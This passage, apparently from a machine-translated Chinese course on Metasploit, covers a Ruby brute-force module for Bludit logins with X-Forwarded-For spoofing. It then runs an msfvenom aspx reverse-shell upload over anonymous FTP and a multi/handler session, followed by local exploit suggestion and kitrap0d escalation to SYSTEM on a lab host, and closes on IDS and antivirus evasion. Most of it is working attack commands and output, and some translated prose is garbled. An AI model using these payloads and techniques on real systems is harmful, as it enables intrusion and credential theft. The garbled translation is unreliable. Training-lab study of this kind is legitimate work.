[<span class="literal">true</span>, <span class="string">&#x27;The username for Bludit&#x27;</span>]),</span><br><span class="line">        <span class="title class_">OptPath</span>.new(<span class="string">&#x27;PASSWORDS&#x27;</span>, [ <span class="literal">true</span>, <span class="string">&#x27;The list of passwords&#x27;</span>,</span><br><span class="line">        <span class="title class_">File</span>.join(<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Config</span>.data_directory, <span class="string">&quot;wordlists&quot;</span>, <span class="string">&quot;passwords.txt&quot;</span>) ])</span><br><span class="line">      ])</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># -- Exploit code -- #</span></span><br><span class="line">  <span class="comment"># dirty workaround to remove this warning:</span></span><br><span class="line"><span class="comment">#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need &quot;.&quot; at the beginning.</span></span><br><span class="line"><span class="comment"># see https://github.com/nahi/httpclient/issues/252</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebAgent</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Cookie</span> &lt; <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Cookie</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">domain</span></span><br><span class="line">      <span class="variable language_">self</span>.original_domain</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_csrf</span>(<span class="params">client, login_url</span>)</span><br><span class="line">  res = client.get(login_url)</span><br><span class="line">  csrf_token = <span class="regexp">/input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;/</span>.match(res.body).captures[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_ok?</span>(<span class="params">res</span>)</span><br><span class="line">  <span class="variable constant_">HTTP</span><span class="symbol">:</span><span class="symbol">:Status</span>.redirect?(res.code) &amp;&amp;</span><br><span class="line">    <span class="regexp">%r&#123;/admin/dashboard&#125;</span>.match?(res.headers[<span class="string">&#x27;Location&#x27;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruteforce_auth</span>(<span class="params">client, host, username, wordlist</span>)</span><br><span class="line">  login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">  <span class="title class_">File</span>.foreach(wordlist).with_index <span class="keyword">do</span> |<span class="params">password, i</span>|</span><br><span class="line">    password = password.chomp</span><br><span class="line">    csrf_token = get_csrf(client, login_url)</span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&#x27;X-Forwarded-For&#x27;</span> =&gt; <span class="string">&quot;<span class="subst">#&#123;i&#125;</span>-<span class="subst">#&#123;password[..<span class="number">4</span>]&#125;</span>&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">      <span class="string">&#x27;tokenCSRF&#x27;</span> =&gt; csrf_token,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; username,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; password,</span><br><span class="line">    &#125;</span><br><span class="line">    puts <span class="string">&quot;[*] Trying password: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">    auth_res = client.post(login_url, data, headers)</span><br><span class="line">    <span class="keyword">if</span> auth_ok?(auth_res)</span><br><span class="line">      puts <span class="string">&quot;\n[+] Password found: <span class="subst">#&#123;password&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#begin</span></span><br><span class="line"><span class="comment">#  args = Docopt.docopt(doc)</span></span><br><span class="line"><span class="comment">#  pp args if args[&#x27;--debug&#x27;]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#  clnt = HTTPClient.new</span></span><br><span class="line"><span class="comment">#  bruteforce_auth(clnt, args[&#x27;--root-url&#x27;], args[&#x27;--user&#x27;], args[&#x27;--#wordlist&#x27;])</span></span><br><span class="line"><span class="comment">#rescue Docopt::Exit =&gt; e</span></span><br><span class="line"><span class="comment">#  puts e.message</span></span><br><span class="line"><span class="comment">#end</span></span><br></pre></td></tr></table></figure><p>如果您想了解有关将脚本移植到 Metasploit 框架中的更多信息，请查看<a href="https://nostarch.com/metasploit">No Starch Press 的 Metasploit：渗透测试人员指南</a>。Rapid7 还创建了关于此主题的博客文章，可<a href="https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/">在此处</a>找到。</p><h1 id="MSF毒液简介"><a href="#MSF毒液简介" class="headerlink" title="MSF毒液简介"></a>MSF毒液简介</h1><hr><p><code>MSFVenom``MSFPayload</code>是和的后继者<code>MSFEncode</code>，这两个独立脚本过去常常与 结合使用，<code>msfconsole</code>为用户提供高度可定制且难以检测的有效负载以进行攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSFVenom`是这两种工具结合的结果。在使用此工具之前，我们必须将用于为特定处理器架构和操作系统版本生成 shellcode 的`|`结果通过管道 ()传输到，其中包含多种编码方案，用于从 shellcode 中删除不良字符。这有时会导致运行时不稳定 - 以及用于规避旧版防病毒 ( ) 和端点入侵防御/入侵检测 ( ) 软件。`MSFPayload``MSFEncode``AV``IPS/IDS</span><br></pre></td></tr></table></figure><p>如今，这两个组合工具为渗透测试人员提供了一种方法，可以为不同的目标主机架构和版本快速制作有效载荷，同时有可能“清理”他们的 shellcode，以便在部署时不会遇到任何错误。如今，AV 规避部分要复杂得多，因为仅基于签名的恶意文件分析已成为过去。<code>Heuristic analysis, machine learning, and deep packet inspection</code>使有效负载更难通过编码方案的几个后续迭代来逃避任何好的 AV 软件。如模块中所示<code>Payloads</code>，提交具有上述相同配置的简单有效载荷产生的命中率为<code>52/65</code>. 就全球恶意软件分析师而言，这就是宾果游戏。（全世界的恶意软件分析师是否真的说“那是宾果游戏”，这一点仍未得到证实。）</p><hr><h2 id="创建我们的有效载荷"><a href="#创建我们的有效载荷" class="headerlink" title="创建我们的有效载荷"></a>创建我们的有效载荷</h2><p>假设我们发现了一个开放的 FTP 端口，该端口要么凭据薄弱，要么意外地对匿名登录开放。现在，假设 FTP 服务器本身链接到在<code>tcp/80</code>同一台机器的端口上运行的 Web 服务，并且可以在 Web 服务的目录中查看 FTP 根目录中找到的所有文件<code>/uploads</code>。我们还假设 Web 服务没有任何检查允许我们作为客户端在其上运行的内容。</p><p>假设我们被允许从 Web 服务中调用任何我们想要的东西。在这种情况下，我们可以直接通过 FTP 服务器上传 PHP shell 并从 Web 访问它，触发有效载荷并允许我们从受害机器接收反向 TCP 连接。</p><h4 id="扫描目标"><a href="#扫描目标" class="headerlink" title="扫描目标"></a>扫描目标</h4><p> 扫描目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 7.5</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h4 id="FTP-匿名访问"><a href="#FTP-匿名访问" class="headerlink" title="FTP 匿名访问"></a>FTP 匿名访问</h4><p> FTP 匿名访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ftp 10.10.10.5</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.5.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name (10.10.10.5:root): anonymous</span><br><span class="line"></span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Password: ******</span><br><span class="line"></span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp&gt; ls</span><br><span class="line"></span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">03-17-17  05:37PM                  689 iisstart.htm</span><br><span class="line">03-17-17  05:37PM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure><p>注意 aspnet_client，我们意识到该框将能够运行<code>.aspx</code>反向 shell。对我们来说幸运的是，<code>msfvenom</code>可以毫无问题地做到这一点。</p><h4 id="生成有效载荷"><a href="#生成有效载荷" class="headerlink" title="生成有效载荷"></a>生成有效载荷</h4><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx &gt; reverse_shell.aspx</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of aspx file: 2819 bytes</span><br></pre></td></tr></table></figure><p> 生成有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls</span><br><span class="line"></span><br><span class="line">Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates</span><br></pre></td></tr></table></figure><p>现在，我们只需要导航到<code>http://10.10.10.5/reverse_shell.aspx</code>，它就会触发<code>.aspx</code>负载。然而，在我们这样做之前，我们应该在 msfconsole 上启动一个侦听器，以便在其中捕获反向连接请求。</p><h4 id="MSF-设置-Multi-Handler"><a href="#MSF-设置-Multi-Handler" class="headerlink" title="MSF - 设置 Multi&#x2F;Handler"></a>MSF - 设置 Multi&#x2F;Handler</h4><p> MSF - 设置 Multi&#x2F;Handler</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q </span><br><span class="line"></span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.5</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 1337</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br></pre></td></tr></table></figure><hr><h2 id="执行负载"><a href="#执行负载" class="headerlink" title="执行负载"></a>执行负载</h2><p>现在我们可以触发<code>.aspx</code>Web 服务上的负载。这样做不会在页面上加载任何视觉上的内容，但回顾我们的<code>multi/handler</code>模块，我们会收到一个连接。我们应该确保我们的<code>.aspx</code>文件不包含 HTML，因此我们只会看到一个空白网页。然而，有效负载无论如何都是在后台执行的。</p><h4 id="MSF-Meterpreter-外壳"><a href="#MSF-Meterpreter-外壳" class="headerlink" title="MSF - Meterpreter 外壳"></a>MSF - Meterpreter 外壳</h4><p> MSF - Meterpreter 外壳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1337 </span><br><span class="line"></span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:1337 -&gt; 10.10.10.5:49157) at 2020-08-28 16:33:14 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: IIS APPPOOL\Web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Meterpreter session 1 closed.  Reason: Died</span><br></pre></td></tr></table></figure><p>如果 Meterpreter 会话死得太频繁，我们可以考虑对其进行编码以避免在运行时出错。我们可以选择任何可行的编码器，无论如何它最终都会提高我们成功的机会。</p><hr><h2 id="本地漏洞利用建议"><a href="#本地漏洞利用建议" class="headerlink" title="本地漏洞利用建议"></a>本地漏洞利用建议</h2><p>作为提示，有一个名为<code>Local Exploit Suggester</code>. 我们将在这个例子中使用这个模块，因为 Meterpreter shell 登陆用户<code>IIS APPPOOL\Web</code>，自然没有很多权限。此外，运行该<code>sysinfo</code>命令向我们展示了系统是 x86 位架构，让我们更有理由相信 Local Exploit Suggester。</p><h4 id="MSF-搜索本地漏洞利用建议者"><a href="#MSF-搜索本地漏洞利用建议者" class="headerlink" title="MSF - 搜索本地漏洞利用建议者"></a>MSF - 搜索本地漏洞利用建议者</h4><p> MSF - 搜索本地漏洞利用建议者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search local exploit suggester</span><br><span class="line"></span><br><span class="line">&lt;...SNIP...&gt;</span><br><span class="line">   2375  post/multi/manage/screenshare                                                              normal     No     Multi Manage the screen of the target meterpreter session</span><br><span class="line">   2376  post/multi/recon/local_exploit_suggester                                                   normal     No     Multi Recon Local Exploit Suggester</span><br><span class="line">   2377  post/osx/gather/apfs_encrypted_volume_passwd                              2018-03-21       normal     Yes    Mac OS X APFS Encrypted Volume Password Disclosure</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 2376</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line"></span><br><span class="line">session =&gt; 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.5 - Collecting local exploits for x86/windows...</span><br><span class="line">[*] 10.10.10.5 - 31 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><p>将这些结果摆在我们面前，我们可以轻松地选择其中一个进行测试。如果我们选择的一个最终无效，请继续进行下一个。并非所有检查都是 100% 准确的，并非所有变量都相同。往下看，<code>bypassauc_eventvwr</code>失败是因为 IIS 用户不是管理员组的一部分，这是默认和预期的。第二个选项<code>ms10_015_kitrap0d</code>可以解决问题。</p><h4 id="MSF-本地权限提升"><a href="#MSF-本地权限提升" class="headerlink" title="MSF - 本地权限提升"></a>MSF - 本地权限提升</h4><p> MSF - 本地权限提升</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; search kitrap0d</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                     Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                     ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms10_015_kitrap0d  2010-01-19       great  Yes    Windows SYSTEM Escalation via KiTrap0D</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; use 0</span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/ms10_015_kitrap0d):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  2                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     tun0             yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     1338             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set LPORT 1338</span><br><span class="line"></span><br><span class="line">LPORT =&gt; 1338</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; set SESSION 3</span><br><span class="line"></span><br><span class="line">SESSION =&gt; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:1338 </span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 3552 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 3552...</span><br><span class="line">[*] Injecting exploit into 3552 ...</span><br><span class="line">[*] Exploit injected. Injecting payload into 3552...</span><br><span class="line">[*] Payload injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (176195 bytes) to 10.10.10.5</span><br><span class="line">[*] Meterpreter session 4 opened (10.10.14.5:1338 -&gt; 10.10.10.5:49162) at 2020-08-28 17:15:56 +0000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><h1 id="防火墙和-IDS-IPS-规避"><a href="#防火墙和-IDS-IPS-规避" class="headerlink" title="防火墙和 IDS&#x2F;IPS 规避"></a>防火墙和 IDS&#x2F;IPS 规避</h1><hr><p>为了更好地了解我们如何高效、安静地攻击目标，我们首先需要更好地了解该目标是如何防御的。我们介绍了两个新术语：</p><ul><li>端点保护</li><li>周界保护</li></ul><hr><h2 id="端点保护"><a href="#端点保护" class="headerlink" title="端点保护"></a>端点保护</h2><p><code>Endpoint protection</code>指任何本地化设备或服务，其唯一目的是保护网络上的单个主机。主机可以是个人计算机、公司工作站或网络非军事区 (De-Militarized Zone <code>DMZ</code>) 中的服务器。</p><p>端点保护通常以软件包的形式出现，其中包括<code>Antivirus Protection</code>, <code>Antimalware Protection</code>（这包括英国媒体报道软件、间谍软件、广告软件、恐吓软件、勒索软件），<code>Firewall</code>以及<code>Anti-DDOS</code>所有这些都在同一个软件包中。我们比后者更熟悉这种形式，因为我们大多数人都在家里的 PC 或工作场所的工作站上运行端点保护软件。Avast、Nod32、Malwarebytes 和 BitDefender 只是一些当前名称。</p><hr><h4 id="周界保护"><a href="#周界保护" class="headerlink" title="周界保护"></a>周界保护</h4><p><code>Perimeter protection</code>通常出现在网络外围边缘的物理或虚拟设备中。它们<code>edge devices</code>本身提供<code>inside</code>从 的网络访问<code>outside</code>，换句话说，从<code>public</code>到<code>private</code>。</p><p>在这两个区域之间，在某些情况下，我们还会发现第三个区域，称为非军事区 (De-Militarized Zone <code>DMZ</code>)，如前所述。这是一个<code>lower-security policy level</code>比一个地带<code>inside networks&#39;</code>，但比一个更高的<code>trust level</code>地带<code>outside zone</code>，这就是浩瀚的互联网。这是面向公众的服务器所在的虚拟空间，它们从 Internet 为公共客户端推送和拉取数据，但也从内部进行管理，并使用补丁、信息和其他数据进行更新，以使所服务的信息保持最新和满足服务器的客户。</p><hr><h2 id="安全政策"><a href="#安全政策" class="headerlink" title="安全政策"></a>安全政策</h2><p>安全策略是任何网络维护良好的安全状态背后的驱动力。它们的功能与 ACL（访问控制列表）对熟悉 Cisco CCNA 教育材料的任何人的作用相同。它们本质上是一个列表<code>allow</code>和<code>deny</code>语句，指示流量或文件如何存在于网络边界内。多个列表可以作用于多个网络部分，允许配置中的灵活性。这些列表还可以针对网络和主机的不同功能，具体取决于它们所在的位置：</p><ul><li>网络流量策略</li><li>申请政策</li><li>用户访问控制策略</li><li>文件管理政策</li><li>DDoS 保护策略</li><li>其他的</li></ul><p>虽然并非上述所有这些类别都带有“安全策略”一词，但围绕它们的所有安全机制都基于相同的基本原则运行，即和<code>allow</code>条目<code>deny</code>。唯一的区别是它们引用和应用的对象目标。所以问题仍然存在，我们如何将网络中的事件与这些规则匹配，以便可以采取前面提到的行动？</p><p>有多种方法可以将事件或对象与安全策略条目相匹配：</p><table><thead><tr><th><strong>安全政策</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Signature-based Detection</code></td><td>数据包在网络中的操作以及与称为签名的预建和预定攻击模式的比较。与这些签名的任何 100% 匹配都会产生警报。</td></tr><tr><td><code>Heuristic / Statistical Anomaly Detection</code></td><td>与既定基线的行为比较包括已知 APT（高级持续威胁）的作案手法签名。基线将确定网络的规范以及常用的协议。任何与最大阈值的偏差都会产生警报。</td></tr><tr><td><code>Stateful Protocol Analysis Detection</code></td><td>使用普遍接受的非恶意活动定义的预建配置文件，通过事件比较来识别协议的差异。</td></tr><tr><td><code>Live-monitoring and Alerting (SOC-based)</code></td><td>专用、内部或租用的 SOC（安全运营中心）中的一组分析师使用实时馈送软件来监控网络活动和中间警报系统以发现任何潜在威胁，自行决定是否应对威胁采取行动或让自动化机制会采取行动。</td></tr></tbody></table><hr><h2 id="规避技术"><a href="#规避技术" class="headerlink" title="规避技术"></a>规避技术</h2><p>现在大多数基于主机的防病毒软件主要依赖于<code>Signature-based Detection</code>识别软件样本中存在的恶意代码的各个方面。这些签名放置在防病毒引擎内，随后用于扫描存储空间和正在运行的进程以查找任何匹配项。当一个未知软件登陆分区并被防病毒软件匹配时，大多数防病毒软件会隔离恶意程序并杀死正在运行的进程。</p><p>我们如何避开所有这些热量？我们和它一起玩。本节中显示的示例<code>Encoders</code>表明，对于所有 AV 产品，仅使用不同的编码方案和多次迭代对有效载荷进行编码是不够的。此外，仅在攻击者和受害者之间建立一个通信通道就可以用现有的 IDS&#x2F;IPS 产品的当前功能发出一些警报。</p><p>然而，随着 MSF6 版本的发布，msfconsole 可以将 AES 加密的通信从任何 Meterpreter shell 隧道传输回攻击者主机，从而在有效负载发送到受害主机时成功加密流量。这主要用于处理基于网络的 IDS&#x2F;IPS。在极少数情况下，我们可能会遇到非常严格的流量规则集，这些规则集会根据发件人的 IP 地址标记我们的连接。避免这种情况的唯一方法是找到允许通过的服务。一个很好的例子就是 2017 年的 Equifax 黑客攻击，恶意黑客滥用 Apache Struts 漏洞访问关键数据服务器网络。DNS 